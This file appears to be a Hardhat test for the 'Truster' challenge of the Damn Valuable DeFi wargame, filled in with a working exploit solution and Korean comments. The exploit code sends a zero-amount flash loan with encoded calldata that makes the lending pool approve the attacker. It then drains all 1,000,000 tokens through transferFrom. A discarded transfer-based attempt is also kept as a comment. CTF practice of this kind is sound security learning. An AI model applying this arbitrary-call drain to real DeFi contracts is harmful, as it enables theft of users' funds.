const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        console.log(await this.token.balanceOf(this.pool.address));  // 1,000,000 ETH
        console.log(await this.token.balanceOf(attacker.address));   // 0 ETH
        
        // transfer()는 flashLoan()의 require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back"); 때문에 사용 불가능! 
        // approve()만 수행하고 flashLoan() 실행 종료 후, transferFrom()으로 가져오자!
        /*
        const ABI = ["function transfer(address recipient, uint256 amount)"];
        const interface = new ethers.utils.Interface(ABI);
        const payload = interface.encodeFunctionData("transfer", [attacker.address, TOKENS_IN_POOL.toString()]);

        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload);
        */

        const ABI = ["function approve(address, uint256)"];
        const interface = new ethers.utils.Interface(ABI);
        const payload = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);
        
        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload);          // token.approve() : lending pool -> attacker
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
        

        console.log(await this.token.balanceOf(this.pool.address));  // 0 ETH
        console.log(await this.token.balanceOf(attacker.address));   // 1,000,000 ETH
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

